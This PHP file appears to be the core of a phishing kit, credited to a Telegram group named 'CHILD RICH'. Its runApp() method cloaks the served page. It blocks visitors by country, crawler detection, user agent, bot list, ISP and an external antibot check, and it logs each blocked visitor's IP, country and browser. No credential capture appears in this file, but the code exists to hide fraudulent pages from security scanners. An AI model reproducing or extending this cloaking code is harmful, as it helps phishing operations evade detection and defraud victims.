<?php
/*   __________________________________________________
    |                  CHILD RICH                      |
    |            on 2024-09-23 20:05:17                |
    |    Group : https://t.me/childrichgroup           |
    |__________________________________________________|
*/
<?php
use Jaybizzle\CrawlerDetect\CrawlerDetect;

class core {
    private $pc;
    private $requestHandler;
    private $crawlerDetect;

    public function __construct() {
        $this->pc = new Pc();
        $this->requestHandler = new RequestHandler(); 
        $this->crawlerDetect = new CrawlerDetect();
    }

    public function runApp() {
        if ($this->requestHandler->getdata('lockcountry') == 'on') { 
            
            if (!isLockCountry($this->requestHandler->resultdat("countryCode",$this->requestHandler->getPublicIP()))) {
            $this->requestHandler->write($this->requestHandler->visitorPath . 'log_crawler.txt', 'a', "|".$this->requestHandler->waktu()."|{$this->requestHandler->getPublicIP()}|{$this->requestHandler->resultdat("country",$this->requestHandler->getPublicIP())}|{$this->pc->browser}|Blocked Robots by System MelnaisBot\r\n");
            $this->requestHandler->terminateApp("Your System Detected Bot.");
            }
        }
        if ($this->crawlerDetect->isCrawler()) {
            $this->requestHandler->write($this->requestHandler->visitorPath . 'log_crawler.txt', 'a', "|".$this->requestHandler->waktu()."|{$this->requestHandler->getPublicIP()}|{$this->requestHandler->resultdat("country",$this->requestHandler->getPublicIP())}|{$this->pc->browser}|Blocked by MelnaisBot\r\n");
            $this->requestHandler->terminateApp("Crawler Detected.");
        }

        if (isUserAgentBlocked()) {
            $this->requestHandler->write($this->requestHandler->visitorPath . 'log_crawler.txt', 'a', "|".$this->requestHandler->waktu()."|{$this->requestHandler->getPublicIP()}|{$this->requestHandler->resultdat("country",$this->requestHandler->getPublicIP())}|{$this->pc->browser}|Blocked User Agent by System MelnaisBot\r\n");
            $this->requestHandler->terminateApp("Your System Detected Bot.");
        }
        
        if (isBotBlocked()) {
            $this->requestHandler->write($this->requestHandler->visitorPath . 'log_crawler.txt', 'a', "|".$this->requestHandler->waktu()."|{$this->requestHandler->getPublicIP()}|{$this->requestHandler->resultdat("country",$this->requestHandler->getPublicIP())}|{$this->pc->browser}|Blocked Robots by System MelnaisBot\r\n");
            $this->requestHandler->terminateApp("Your System Detected Bot.");
        }
        
        if (isIsPBlocked($this->requestHandler->resultdat("isp",$this->requestHandler->getPublicIP()))) {
            $this->requestHandler->write($this->requestHandler->visitorPath . 'log_crawler.txt', 'a', "|".$this->requestHandler->waktu()."|{$this->requestHandler->getPublicIP()}|{$this->requestHandler->resultdat("country",$this->requestHandler->getPublicIP())}|{$this->pc->browser}|Blocked Isp by System MelnaisBot\r\n");
            $this->requestHandler->terminateApp("Your System Detected Bot.");
        }
        
		if (!empty($this->requestHandler->getdata('antibot'))){
			if($this->requestHandler->antibot($this->pc->ip_address, $this->pc->agent)) {
                $this->requestHandler->write($this->requestHandler->visitorPath . 'log_crawler.txt', 'a', "|".$this->requestHandler->waktu()."|{$this->requestHandler->getPublicIP()}|{$this->requestHandler->resultdat("country",$this->requestHandler->getPublicIP())}|{$this->pc->browser}|Blocked by System MelnaisBot\r\n");
                $this->requestHandler->terminateApp("Bot Detected By Antibot.");
            }
        }

        if (!$this->requestHandler->isInstalled()) {
            $this->requestHandler->terminateApp("Belum terinstal");
        }
        $this->requestHandler->processRequest();
    }

}
?>
